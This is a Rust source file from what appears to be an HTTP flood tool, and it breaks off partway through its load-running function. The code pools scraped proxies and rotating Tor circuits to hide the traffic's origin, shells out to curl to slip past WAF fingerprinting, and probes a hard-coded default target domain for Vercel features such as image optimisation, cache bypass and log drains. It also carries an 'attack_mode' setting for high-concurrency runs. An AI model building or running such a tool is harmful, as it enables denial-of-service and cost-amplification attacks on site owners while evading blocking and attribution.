use crate::types::*;
use crate::http::*;
use crate::proto::*;
use rand::prelude::*;
use rand::distr::{Distribution, weighted::WeightedIndex};
use reqwest::{Client, RequestBuilder};
use scraper::{Html, Selector};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, AtomicU32, Ordering};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::sync::{Mutex, Semaphore};
use url::Url;


pub(crate) const DEFAULT_TARGET_URL: &str = "https://livdevries.com";


impl Default for ClientConfig {
    fn default() -> Self {
        ClientConfig {
            pinned_dns: None,
            pool_max_idle: 20,
            pool_idle_timeout: Duration::from_secs(90),
            sni: None,
            timeout: Duration::from_secs(10),
            max_redirects: 10,
            tor_circuits: 3,
            rate_limit: None,
            insecure: false,
            custom_user_agent: None,
            custom_headers: Vec::new(),
        }
    }
}

impl ProxyPool {
    pub(crate) fn new(proxies: &[String], config: &ClientConfig, rotation_strategy: &str) -> Self {
        let mut clients = Vec::new();
        let mut labels = Vec::new();
        let mut weights = Vec::new();
        for u in proxies {
            let url = if u.contains("://") { u.clone() } else { format!("http://{}", u) };
            if url.contains(":isolate@") {
                // SOCKS5 Tor isolated template. Pre-create tor_circuits isolated clients.
                if let Some(base) = url.split('@').nth(1) {
                    let base = base.trim_end_matches('/');
                    for i in 0..config.tor_circuits {
                        let isolated_url = format!("socks5h://tor{}:isolate@{}", i, base);
                        if let Ok(p) = reqwest::Proxy::all(&isolated_url) {
                            if let Ok(c) = browser_client_builder(config).proxy(p).build() {
                                clients.push(c);
                                labels.push(isolated_url);
                                weights.push(1.0);
                            }
                        }
                    }
                }
            } else if let Ok(p) = reqwest::Proxy::all(&url) {
                if let Ok(c) = browser_client_builder(config).proxy(p).build() {
                    clients.push(c);
                    labels.push(url.clone());
                    weights.push(1.0);
                }
            }
        }
        let n = clients.len();
        ProxyPool {
            clients,
            labels,
            current: 0,
            cooldown_until: vec![Instant::now(); n],
            failure_tier: vec![0; n],
            succeeded: vec![false; n],
            weights,
            active_indices: Vec::with_capacity(n),
            active_weights: Vec::with_capacity(n),
            config: config.clone(),
            circuit_ids: vec![u32::MAX; n],
            circuit_cooldown: vec![Instant::now(); n],
            circuit_failures: vec![0; n],
            circuit_stickiness: config.tor_circuits.max(3),
            circuit_rotation_counter: AtomicUsize::new(0),
            circuit_requests: Arc::new(std::sync::Mutex::new(HashMap::<usize, (u64, u64)>::new())),
            rotation_strategy: rotation_strategy.to_string(),
        }
    }

    pub(crate) fn next(&mut self) -> Option<(usize, Client)> {
        if self.clients.is_empty() {
            return None;
        }
        let now = Instant::now();
        self.active_indices.clear();
        self.active_weights.clear();
        for i in 0..self.clients.len() {
            // Skip proxies in cooldown
            if self.cooldown_until[i] > now {
                continue;
            }
            // Skip circuits in ban (exponential backoff)
            if self.circuit_cooldown[i] > now {
                continue;
            }
            self.active_indices.push(i);
            self.active_weights.push(self.weights[i]);
        }
        if self.active_indices.is_empty() {
            return None;
        }
        let mut rng = rand::rng();
        let idx = match self.rotation_strategy.as_str() {
            "round-robin" => {
                // Simple round-robin through active indices
                let sample_idx = rng.random_range(0..self.active_indices.len());
                self.active_indices[sample_idx]
            }
            "random" => {
                // Pure random selection
                let sample_idx = rng.random_range(0..self.active_indices.len());
                self.active_indices[sample_idx]
            }
            _ => {
                // Weighted selection (default)
                if self.active_weights.iter().all(|&w| w == self.active_weights[0]) {
                    let sample_idx = rng.random_range(0..self.active_indices.len());
                    self.active_indices[sample_idx]
                } else {
                    let dist = WeightedIndex::new(&self.active_weights).ok()?;
                    let sample_idx = dist.sample(&mut rng);
                    self.active_indices[sample_idx]
                }
            }
        };

        // Tor circuit rotation: prefer different circuits each call.
        if self.labels[idx].contains("tor") {
            // Apply circuit stickiness for Tor circuits.
            if self.circuit_stickiness > 0 {
                let now = Instant::now();
                let tor_circuits: Vec<usize> = self.active_indices.iter()
                    .copied()
                    .filter(|&i| self.labels[i].contains("tor"))
                    .filter(|&i| self.circuit_cooldown[i] <= now)
                    .collect();
                if !tor_circuits.is_empty() {
                    // Health-aware load balancing: once success/failure feedback has
                    // skewed the weights (degraded circuit = low weight), distribute
                    // load proportionally so a slow circuit never carries as much
                    // traffic as a healthy one — avoids SOCKS5 overload and wasted
                    // throughput on a dying circuit. A fresh pool (all weights equal)
                    // rotates round-robin as before.
                    let weights: Vec<f64> = tor_circuits.iter().map(|&i| self.weights[i]).collect();
                    if weights.iter().all(|&w| w == weights[0]) {
                        let counter = self.circuit_rotation_counter.fetch_add(1, Ordering::Relaxed);
                        let new_idx = tor_circuits[counter % tor_circuits.len()];
                        return Some((new_idx, self.clients[new_idx].clone()));
                    }
                    if let Ok(dist) = WeightedIndex::new(&weights) {
                        let new_idx = tor_circuits[dist.sample(&mut rng)];
                        return Some((new_idx, self.clients[new_idx].clone()));
                    }
                }
                // Fallback: the strategy-selected index (non-Tor slot, or no Tor
                // circuit is currently usable).
                return Some((idx, self.clients[idx].clone()));
            }
        }

        Some((idx, self.clients[idx].clone()))
    }

    /// Return the SOCKS5 proxy URL associated with pool slot `idx` (for modes
    /// that dial their own connection — websocket/h2 — so they stay on the same
    /// Tor circuit as the HTTP requests from this slot).
    pub(crate) fn proxy_for(&self, idx: usize) -> Option<String> {
        self.labels.get(idx).cloned()
    }

    pub(crate) fn report_success(&mut self, idx: usize, latency_ms: u64) {
        if idx < self.clients.len() {
            self.succeeded[idx] = true;
            self.failure_tier[idx] = 0;
            // Reset circuit consecutive failures on success
            self.circuit_failures[idx] = 0;
            let factor = if latency_ms < 200 {
                1.3
            } else if latency_ms < 600 {
                1.0
            } else if latency_ms < 1500 {
                0.7
            } else {
                0.3
            };
            self.weights[idx] = (self.weights[idx] * 0.85 + 0.15 * factor).clamp(0.01, 3.0);
            if let Ok(mut m) = self.circuit_requests.lock() {
                let e = m.entry(idx).or_insert((0, 0));
                e.0 += 1;
            }
        }
    }

    pub(crate) fn report_failure(&mut self, idx: usize) {
        if idx < self.clients.len() {
            self.failure_tier[idx] += 1;
            // Gentle tiered per-proxy cooldown: 1s, 2s, 3s, 5s, 8s
            let tiered: [u64; 5] = [1, 2, 3, 5, 8];
            let tier = (self.failure_tier[idx] - 1).min(4) as usize;
            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(tiered[tier]);
            // Weight decay: 0.8x on failure
            self.weights[idx] = (self.weights[idx] * 0.8).max(0.01);

            // Circuit-level tracking
            self.circuit_failures[idx] = self.circuit_failures[idx].saturating_add(1);
            let fail_count = self.circuit_failures[idx];
            // Exponential backoff for circuit bans: 12s → 24s → 48s → 96s → 180s
            if fail_count >= 1 {
                let ban_secs = match fail_count {
                    1 => 12,
                    2 => 24,
                    3 => 48,
                    4 => 96,
                    _ => 180,
                };
                self.circuit_cooldown[idx] = Instant::now() + Duration::from_secs(ban_secs);
            }
            if let Ok(mut m) = self.circuit_requests.lock() {
                let e = m.entry(idx).or_insert((0, 0));
                e.0 += 1;
                e.1 += 1;
            }
        }
    }
}


impl LatencySamples {
    pub(crate) fn new(size: usize) -> Self {
        let mut samples = Vec::with_capacity(size);
        for _ in 0..size {
            samples.push(AtomicU32::new(0));
        }
        LatencySamples {
            samples,
            idx: AtomicUsize::new(0),
        }
    }
    pub(crate) fn record(&self, val: u32) {
        if self.samples.is_empty() { return; }
        let pos = self.idx.fetch_add(1, Ordering::Relaxed) % self.samples.len();
        self.samples[pos].store(val, Ordering::Relaxed);
    }
    pub(crate) fn get_percentiles(&self) -> (u32, u32, u32, u32) {
        let mut res = Vec::new();
        for s in &self.samples {
            let v = s.load(Ordering::Relaxed);
            if v > 0 {
                res.push(v);
            }
        }
        if res.is_empty() {
            return (0, 0, 0, 0);
        }
        res.sort_unstable();
        let len = res.len();
        let p50 = res[len * 50 / 100];
        let p90 = res[len * 90 / 100];
        let p95 = res[len * 95 / 100];
        let p99 = res[len * 99 / 100];
        (p50, p90, p95, p99)
    }
}

/// Compute (p50, p90, p95, p99) from an owned slice of latency samples.
/// Used for per-interval time-series snapshots: the caller drains the
/// interval_latency buffer each tick and passes the drained batch here, so
/// each point reflects only that interval's requests (the real degradation
/// curve), not the whole-run rolling buffer.
pub(crate) fn percentiles_from(samples: &mut [u32]) -> (u32, u32, u32, u32) {
    if samples.is_empty() {
        return (0, 0, 0, 0);
    }
    samples.sort_unstable();
    let len = samples.len();
    (
        samples[len * 50 / 100],
        samples[len * 90 / 100],
        samples[len * 95 / 100],
        samples[len * 99 / 100],
    )
}


impl Stats {
    pub(crate) fn new() -> Self {
        Stats {
            running: Arc::new(AtomicBool::new(false)),
            total_requests: Arc::new(AtomicU64::new(0)),
            total_bytes: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
            error_timeout: Arc::new(AtomicU64::new(0)),
            error_connect: Arc::new(AtomicU64::new(0)),
            error_other: Arc::new(AtomicU64::new(0)),
            total_latency_ms: Arc::new(AtomicU64::new(0)),
            status_2xx: Arc::new(AtomicU64::new(0)),
            status_3xx: Arc::new(AtomicU64::new(0)),
            status_4xx: Arc::new(AtomicU64::new(0)),
            status_5xx: Arc::new(AtomicU64::new(0)),
            status_other: Arc::new(AtomicU64::new(0)),
            status_hist: Arc::new(std::array::from_fn(|_| AtomicU64::new(0))),
            latency_samples: Arc::new(LatencySamples::new(16384)),
            interval_latency: Arc::new(std::sync::Mutex::new(Vec::with_capacity(4096))),
            concurrency: Arc::new(AtomicUsize::new(20)),
            abort: Arc::new(AtomicBool::new(false)),
        }
    }
}


impl AppState {
    pub(crate) fn new() -> Self { AppState {
        mode: ProxyMode::Scrape, stats: Stats::new(), iteration: 0,
        status_msg: "Ready".to_string(), proxy_status: vec![],
        total_alive: 0, total_working: 0, total_scraped: 0,
        scrape_phase: 0, scrape_total: 0, tcp_checked: 0, tcp_total: 0,
        validated: 0, validation_total: 0, target_url: DEFAULT_TARGET_URL.to_string(),
        attack_mode: AttackMode::Normal, max_scrape: 100_000, load_concurrency: 20,
        interval_ms: 10, jitter_ms: 50, jitter_percent: None, tcp_concurrency: 500,
        rate_limit: None,
        validate_concurrency: 500, validate_timeout_secs: 1,
        probe_status: "Not probed".to_string(), has_image_opt: false, has_api: false,
        has_middleware: false, is_vercel: false, vercel_plan: String::new(),
        has_isr: false, has_cache_bypass: false, has_edge_config: false, has_log_drains: false, has_storage: false,
        imgs: vec![], apis: vec![], statics: vec![],
        sessions: Arc::new(Vec::new()),
        client_config: ClientConfig::default(),
        custom_selector: None,
        tor_proxy: None,
        verbose: false,
        max_retries: 3,
        // Safety controls
        max_requests: 0,
        concurrency_max: 0,
        error_rate_threshold: 1.0,
        throughput_cap_mbps: 0.0,
        waf_profile: std::sync::Arc::new(std::sync::Mutex::new(crate::types::WafProfile::default())),
        use_crawl: false,
    }}
}


pub(crate) fn url_join(base: &str, href: &str) -> String {
    let href = href.trim();
    if href.is_empty() || href.starts_with("data:") || href.starts_with("blob:") || href.starts_with("javascript:") || href.starts_with("#") { return String::new(); }
    if href.starts_with("http://") || href.starts_with("https://") { return href.to_string(); }
    if href.starts_with("//") { return format!("https:{}", href); }
    let base = base.trim_end_matches('/');
    format!("{}/{}", base, href.trim_start_matches('/'))
}


pub(crate) async fn send_with_retry_for_probe(
    builder: RequestBuilder,
    max_retries: usize,
    name: &str,
) -> Result<reqwest::Response, FetchError> {
    let mut last_err: Option<FetchError> = None;
    for attempt in 0..=max_retries {
        let cloned = clone_request_builder_with_retry(&builder, name).await?;
        match cloned.send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_server_error() && attempt < max_retries {
                    last_err = Some(FetchError::from(std::io::Error::other(format!(
                        "{name}: server error {status}"
                    ))));
                    let backoff = Duration::from_millis(500 * (1u64 << attempt)).min(Duration::from_secs(8));
                    tokio::time::sleep(backoff).await;
                    continue;
                }
                return Ok(resp);
            }
            Err(e) => {
                if (e.is_timeout() || e.is_connect()) && attempt < max_retries {
                    last_err = Some(FetchError::from(e));
                    let backoff = Duration::from_millis(500 * (1u64 << attempt)).min(Duration::from_secs(8));
                    tokio::time::sleep(backoff).await;
                    continue;
                }
                return Err(FetchError::from(e));
            }
        }
    }
    Err(match last_err {
        Some(err) => err,
        None => FetchError::from(std::io::Error::other(format!(
            "{name}: all retries exhausted"
        ))),
    })
}


pub(crate) async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) -> Result<(), reqwest::Error> {
    let (config, tor_proxy_opt, mode, max_retries) = {
        let st = state.lock().await;
        (st.client_config.clone(), st.tor_proxy.clone(), st.mode, st.max_retries)
    };
    let effective_tor_proxy = if let Some(ref p) = tor_proxy_opt {
        Some(p.clone())
    } else if mode == ProxyMode::Tor || mode == ProxyMode::ScrapeTorFallback {
        Some("socks5h://127.0.0.1:9050".to_string())
    } else {
        None
    };

    let mut builder = browser_client_builder(&config).redirect(reqwest::redirect::Policy::limited(config.max_redirects))
        .timeout(Duration::from_secs(5))
        .danger_accept_invalid_certs(true);
    if let Some(ref p) = effective_tor_proxy {
        if let Ok(proxy_val) = reqwest::Proxy::all(p) {
            builder = builder.proxy(proxy_val);
        }
    }
    let c = builder.build()?;

    let base = target_url.trim_end_matches('/');
    let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
    let mut imgs: Vec<String> = vec![]; let mut apis: Vec<String> = vec![]; let mut statics: Vec<String> = vec![]; let mut imgopt = false;
    let mut isr = false; let mut cache_bypass = false; let mut edge_config = false; let mut html = String::new();
    let mut root_ok = false;

    // Fetch headers using curl to bypass JA3/WAF blocks.
    // Tor cold circuits can exceed 10s on first connect, so give generous timeouts.
    let curl_tmo = if effective_tor_proxy.is_some() { "20" } else { "5" };
    let mut curl_args = vec!["-I", "-s", "-m", curl_tmo, "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
    let mut curl_proxy_arg = String::new();
    if let Some(ref proxy) = effective_tor_proxy {
        curl_proxy_arg = format!("socks5h://{}", proxy.trim_start_matches("socks5://").trim_start_matches("socks5h://"));
        curl_args.push("--proxy");
        curl_args.push(&curl_proxy_arg);
    }
    curl_args.push(base);

    let cmd = tokio::process::Command::new("curl")
        .args(&curl_args)
        .output()
        .await;

    if let Ok(out) = cmd {
        let stdout_str = String::from_utf8_lossy(&out.stdout).to_string();
        for line in stdout_str.lines() {
            let line_lower = line.to_lowercase();
            if let Some(rest) = line_lower.strip_prefix("server:") {
                let val = rest.trim();
                if val.to_lowercase().contains("vercel") {
                    vercel = true;
                }
                if val.to_lowercase().contains("cloudflare") {
                    plan = "Cloudflare".to_string();
                }
            } else if let Some(rest) = line_lower.strip_prefix("x-vercel-id:") {
                let val = rest.trim();
                plan = format!("Vercel ({})", val.split("::").next().unwrap_or(""));
                vercel = true;
            } else if line_lower.starts_with("x-middleware-") || line_lower.starts_with("x-middleware-next:") || line_lower.starts_with("x-middleware-request:") {
                middleware = true;
            } else if line_lower.starts_with("x-vercel-edge-config-") || line_lower.starts_with("x-edge-config-") {
                edge_config = true;
            } else if let Some(rest) = line_lower.strip_prefix("x-vercel-cache:") {
                let val = rest.trim();
                if val == "REVALIDATED" {
                    isr = true;
                }
                if val == "MISS" || val == "STALE" {
                    cache_bypass = true;
                }
            } else if line_lower.starts_with("x-nextjs-cache:") {
                isr = true;
            }
        }
    }

    // Fetch HTML body using curl (bypass WAF/JA3)
    let html_tmo = if effective_tor_proxy.is_some() { "25" } else { "8" };
    let mut curl_html_args = vec![
        "-s", "-m", html_tmo, "-L",
        "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: en-US,en;q=0.9",
        "-H", "Accept-Encoding: gzip, deflate, br",
        "--compressed",
    ];
    if effective_tor_proxy.is_some() {
        curl_html_args.push("--proxy");
        curl_html_args.push(&curl_proxy_arg);
    }
    curl_html_args.push(base);

    let html_cmd = tokio::process::Command::new("curl")
        .args(&curl_html_args)
        .output()
        .await;
    if let Ok(out) = html_cmd {
        if out.status.success() {
            root_ok = true;
            html = String::from_utf8_lossy(&out.stdout).to_string();
        }
    }

    if !html.is_empty() {
        let doc = Html::parse_document(&html);
        for sel in & [("link[href]", "href"), ("script[src]", "src"), ("img[src]", "src")] {
            let s = match Selector::parse(sel.0) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("  Failed to parse selector '{}': {}", sel.0, e);
                    continue;
                }
            };
            for el in doc.select(&s) { if let Some(v) = el.value().attr(sel.1) { let j = url_join(base, v); if !j.is_empty() { statics.push(j); } } }
        }
        let src_sel = match Selector::parse("source[srcset]") {
            Ok(s) => s,
            Err(e) => {
                eprintln!("  Failed to parse selector 'source[srcset]': {}", e);
                return Ok(());
            }
        };
        for el in doc.select(&src_sel) {
            if let Some(srcset) = el.value().attr("srcset") {
                let first = srcset.split(',').next().unwrap_or("").split_whitespace().next().unwrap_or("");
                let j = url_join(base, first); if !j.is_empty() { statics.push(j); }
            }
        }
    }
    for path in & ["/favicon.ico", "/favicon.svg", "/favicon.png"] { let f = format!("{}{}", base, path); if !statics.contains(&f) { statics.push(f); } }
    statics.sort(); statics.dedup();

    // Concurrently verify statics
    let mut verified_statics: Vec<String> = vec![];
    let sem = Arc::new(Semaphore::new(10));
    let mut join_handles = vec![];
    for path in statics {
        let sem_clone = sem.clone();
        let c_clone = c.clone();
        let path_clone = path.clone();
        let vercel_clone = vercel;
        join_handles.push(tokio::spawn(async move {
            let _permit = match sem_clone.acquire().await { Ok(p) => p, Err(_) => return (path_clone.clone(), false, false, false) };
            let mut is_img = false;
            let mut is_img_opt = false;
            let mut is_ok = false;
            if let Ok(r) = send_with_retry_for_probe(browser_request(c_clone.get(&path_clone), false), max_retries, "probe_static").await {
                if r.status().as_u16() < 400 {
                    let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
                    if sz > 0 {
                        is_ok = true;
                        let lower = path_clone.to_lowercase();
                        if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
                            is_img = true;
                            if vercel_clone {
                                if let Ok(r2) = send_with_retry_for_probe(browser_request(c_clone.get(format!("{}?width=300", path_clone)), false), max_retries, "probe_imgopt").await {
                                    let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
                                    if sz2 > 0 && sz2 != sz {
                                        is_img_opt = true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            (path_clone, is_ok, is_img, is_img_opt)
        }));
    }
    for h in join_handles {
        if let Ok((path, is_ok, is_img, is_img_opt)) = h.await {
            if is_ok {
                verified_statics.push(path.clone());
                if is_img {
                    imgs.push(path);
                    if is_img_opt {
                        imgopt = true;
                    }
                }
            }
        }
    }

    // Concurrently verify APIs
    let api_paths = ["/api/chat", "/api/health", "/api/status", "/api/products", "/api/generate"];
    let mut api_handles = vec![];
    for path in api_paths {
        let c_clone = c.clone();
        let url = format!("{}{}", base, path);
        api_handles.push(tokio::spawn(async move {
            if let Ok(r) = send_with_retry_for_probe(browser_request(c_clone.get(&url), false), max_retries, "probe_api").await {
                if r.status().as_u16() < 400 {
                    return Some(path.to_string());
                }
            }
            None
        }));
    }
    for h in api_handles {
        if let Ok(Some(path)) = h.await {
            apis.push(path);
        }
    }
    
    let mut status = String::new();
    // Platform prefix
    if !plan.is_empty() { status.push_str(&format!("{} | ", plan)); } else if vercel { status.push_str("Vercel | "); } else { status.push_str("Unknown | "); }
    // Feature flags
    if !verified_statics.is_empty() { status.push_str(&format!("{} assets ✅ ", verified_statics.len())); }
    if imgopt { status.push_str("ImgOpt ✅ "); }
    if !apis.is_empty() { status.push_str(&format!("{} APIs ✅ ", apis.len())); }
    if middleware { status.push_str("MW ✅ "); }
    if isr { status.push_str("ISR ✅ "); }
    if cache_bypass { status.push_str("CacheBypass ✅ "); }
    if edge_config { status.push_str("EdgeCfg ✅ "); }
    if vercel { status.push_str("LogDrain 🔸 "); }
    // Only mark unreachable if the root fetch itself failed AND no signals were found
    let platform_known = vercel || !plan.is_empty();
    if !root_ok && !platform_known && verified_statics.is_empty() && !imgopt && apis.is_empty() && !middleware { 
        status.push_str("Empty/unreachable"); 
    } else if !verified_statics.is_empty() || !apis.is_empty() || imgopt {
        // Already has detailed info, no extra label needed
    } else if platform_known {
        // Platform confirmed but statics blocked by WAF — still reachable
        status.push_str("Reachable ✅");
    } else if root_ok {
        // Root responded but no platform/feature signals — still reachable
        status.push_str("Reachable ✅");
    }

    let mut st = state.lock().await;
    st.probe_status = status; st.is_vercel = vercel; st.vercel_plan = plan; st.has_image_opt = imgopt; st.has_api = !apis.is_empty(); st.has_middleware = middleware;
    st.has_isr = isr; st.has_cache_bypass = cache_bypass; st.has_edge_config = edge_config; st.has_log_drains = vercel; st.has_storage = false;
    st.imgs = imgs; st.apis = apis; st.statics = verified_statics;
    Ok(())
}


pub(crate) async fn http_proxy_check(proxy_url: &str, target_url: &str, _config: &ClientConfig) -> bool {
    let proxy = match reqwest::Proxy::all(proxy_url) {
        Ok(p) => p,
        Err(_) => return false,
    };
    let client = match reqwest::Client::builder()
        .proxy(proxy)
        .timeout(Duration::from_secs(4))
        .danger_accept_invalid_certs(true)
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    client.get(target_url)
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .send()
        .await
        .is_ok()
}


pub(crate) async fn filter_alive_proxies(proxies: &[String], target_url: &str, config: &ClientConfig, state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let to = 3u64;
    let tc = 1000usize;
    let total = proxies.len();
    state.lock().await.tcp_total = total as u32;
    state.lock().await.status_msg = format!("TCP checking {}...", total);
    let sem = Arc::new(Semaphore::new(tc));
    let d = Arc::new(AtomicUsize::new(0));
    let s2 = Arc::clone(state);
    let mut h = Vec::with_capacity(total);
    
    let target = target_url.to_string();
    let client_cfg = config.clone();

    for p in proxies.iter().cloned() {
        let sem = sem.clone();
        let dd = d.clone();
        let ss = s2.clone();
        let target_clone = target.clone();
        let cfg_clone = client_cfg.clone();
        h.push(tokio::spawn(async move {
            let _permit = match sem.acquire_owned().await { Ok(p) => p, Err(_) => return None, };
            let mut alive = tcp_check(&p, to).await;
            if alive {
                // If TCP port is open, verify proxy routing ability via HTTP request to target URL
                alive = http_proxy_check(&p, &target_clone, &cfg_clone).await;
            }
            let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
            if n.is_multiple_of(500) || n == total {
                let mut lock = ss.lock().await;
                lock.tcp_checked = n as u32;
                lock.status_msg = format!("Checked: {}/{}", n, total);
            }
            if alive {
                Some(p)
            } else {
                None
            }
        }));
    }
    let mut alive_proxies = Vec::new();
    for x in h {
        if let Ok(Some(p)) = x.await {
            alive_proxies.push(p);
        }
    }
    alive_proxies
}


pub(crate) async fn warm_tor_circuits(proxies: &[String], target_url: &str, timeout_secs: u64, gap_secs: u64, n_circuits: usize) {
    // Expand any ":isolate@" SOCKS5 Tor template into its N concrete circuits
    // (tor0..torN-1) so each isolated circuit is warmed exactly once. Non-isolate
    // proxies (plain http/socks) are warmed as-is.
    let mut expanded: Vec<String> = Vec::new();
    for proxy_url in proxies {
        if proxy_url.contains(":isolate@") {
            if let Some(base) = proxy_url.split('@').nth(1) {
                let base = base.trim_end_matches('/');
                for i in 0..n_circuits.max(1) {
                    expanded.push(format!("socks5h://tor{}:isolate@{}", i, base));
                }
            } else {
                expanded.push(proxy_url.clone());
            }
        } else {
            expanded.push(proxy_url.clone());
        }
    }
    for (i, proxy_url) in expanded.iter().enumerate() {
        let warmup_url = format!("{}{}", target_url.trim_end_matches('/'), "/");
        let proxy = match reqwest::Proxy::all(proxy_url) {
            Ok(p) => p,
            Err(e) => {
                eprintln!("  Warning: failed to parse proxy {} for warm-up: {}", i, e);
                continue;
            }
        };
        let client = match reqwest::Client::builder()
            .proxy(proxy)
            .timeout(Duration::from_secs(timeout_secs))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                eprintln!("  Warning: failed to build client for proxy {}: {}", i, e);
                continue;
            }
        };
        let start = Instant::now();
        eprintln!("  Warming circuit {} via {} to {}...", i, proxy_url, warmup_url);
        match tokio::time::timeout(Duration::from_secs(timeout_secs), client.get(&warmup_url).send()).await {
            Ok(Ok(resp)) => {
                let status = resp.status();
                let elapsed = start.elapsed().as_millis();
                eprintln!("  Circuit {} warmed: {} in {}ms", i, status, elapsed);
            }
            Ok(Err(e)) => {
                eprintln!("  Circuit {} warm-up failed: {}", i, e);
            }
            Err(_) => {
                eprintln!("  Circuit {} warm-up timed out after {}s", i, timeout_secs);
            }
        }
        if i + 1 < proxies.len() {
            tokio::time::sleep(Duration::from_secs(gap_secs)).await;
        }
    }
}


pub(crate) async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Vec<String>> {
    let (config, target_url, tor_proxy_opt) = {
        let st = state.lock().await;
        (st.client_config.clone(), st.target_url.clone(), st.tor_proxy.clone())
    };
    match mode {
        ProxyMode::Tor => {
            state.lock().await.status_msg = "Checking Tor...".to_string();
            let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
            let n_unique = config.tor_circuits.max(1);
            if ok {
                state.lock().await.status_msg = "Tor ready".to_string();
                let proxies = vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()];
                // Warm up circuits with HEAD to actual target
                state.lock().await.status_msg = format!("Warming {} Tor circuits...", n_unique);
                warm_tor_circuits(&proxies, &target_url, 20, 2, n_unique).await;
                Some(proxies)
            } else if let Ok(custom) = std::env::var("TOR_PROXY") {
                let base = custom.trim_end_matches('?').trim_end_matches('/');
                let base = if let Some(pos) = base.find('@') { &base[pos+1..] } else { base };
                state.lock().await.status_msg = format!("Using TOR_PROXY: {}", base);
                let proxies = vec![format!("socks5h://tor:isolate@{}", base)];
                warm_tor_circuits(&proxies, &target_url, 20, 2, n_unique).await;
                Some(proxies)
            } else {
                state.lock().await.status_msg = "Tor unavailable".to_string();
                None
            }
        }
        ProxyMode::Scrape | ProxyMode::ScrapeTorFallback => {
            state.lock().await.status_msg = "Scraping proxies...".to_string();
            let effective_tor_proxy = if let Some(ref p) = tor_proxy_opt {
                Some(p.clone())
            } else if mode == ProxyMode::ScrapeTorFallback {
                Some("socks5h://127.0.0.1:9050".to_string())
            } else {
                None
            };
            let mut builder = browser_client_builder(&config).redirect(reqwest::redirect::Policy::limited(config.max_redirects)).timeout(Duration::from_secs(15));
            if let Some(ref p) = effective_tor_proxy {
                if let Ok(proxy_val) = reqwest::Proxy::all(p) {
                    builder = builder.proxy(proxy_val);
                }
            }
            let c = match builder.build() { Ok(c) => c, Err(_) => return None, };
            let scraped = match tokio::time::timeout(Duration::from_secs(30), scrape_all(&c, state)).await {
                Ok(res) => {
                    println!("  Scraped {} proxy candidates from online sources.", res.len());
                    res
                }
                Err(_) => {
                    let mut st = state.lock().await;
                    st.status_msg = "Proxy scraping timed out".to_string();
                    vec![]
                }
            };
            if scraped.is_empty() {
                if mode == ProxyMode::ScrapeTorFallback { /* fall through to Tor */ }
                else { state.lock().await.status_msg = "No proxies scraped".to_string(); return None; }
            }
            state.lock().await.status_msg = format!("{} proxies scraped", scraped.len());
            state.lock().await.total_scraped = scraped.len();
            
            let sample: Vec<String> = {
                use rand::seq::SliceRandom;
                let mut rng = rand::rng();
                let mut shuffled_scraped = scraped;
                shuffled_scraped.shuffle(&mut rng);
                shuffled_scraped.into_iter().take(3000).collect()
            };
            let alive = filter_alive_proxies(&sample, &target_url, &config, state).await;
            state.lock().await.total_alive = alive.len(); state.lock().await.status_msg = format!("TCP alive: {}", alive.len());
            let mut result = alive;
            result.sort(); result.dedup();
            if result.is_empty() && mode == ProxyMode::ScrapeTorFallback {
                state.lock().await.status_msg = "Scrape failed, Tor fallback...".to_string();
                if tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some() {
                    return Some(vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()]);
                } else { state.lock().await.status_msg = "Tor fallback unavailable".to_string(); return None; }
            }
            if result.is_empty() { None } else { result.sort(); result.dedup(); Some(result) }
        }
    }
}


pub(crate) async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
    let (mut conc, interval, attack, sessions, _, apis, _statics, rate_limit, verbose, max_retries, jitter_percent, insecure, use_crawl) = {
        let st = state.lock().await;
        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone(), st.rate_limit, st.verbose, st.max_retries, st.jitter_percent, st.client_config.insecure, st.use_crawl)
    };
    
    // Safety controls
    let safety = {
        let st = state.lock().await;
        (
            st.max_requests,
            st.concurrency_max,
            st.error_rate_threshold,
            st.throughput_cap_mbps,
        )
    };
    
    // Safety enforcement: apply limits
    let mut effective_conc = conc;
    if safety.0 > 0 {
        effective_conc = effective_conc.min(safety.0 as usize);
    }
    if safety.1 > 0 {
        effective_conc = effective_conc.min(safety.1);
    }
    let throughput_cap_bytes = if safety.3 > 0.0 {
        (safety.3 * 1024.0 * 1024.0 / 8.0) as u64
    } else {
        0
    };
    
    let mut jitter_ms;
    
    // Safety enforcement: apply throughput cap (checked per-loop before spawning)
    if throughput_cap_bytes > 0 {
        stats.total_bytes.store(0, Ordering::Relaxed);
    }
    
    let mut semaphore = Arc::new(Semaphore::new(effective_conc));
    
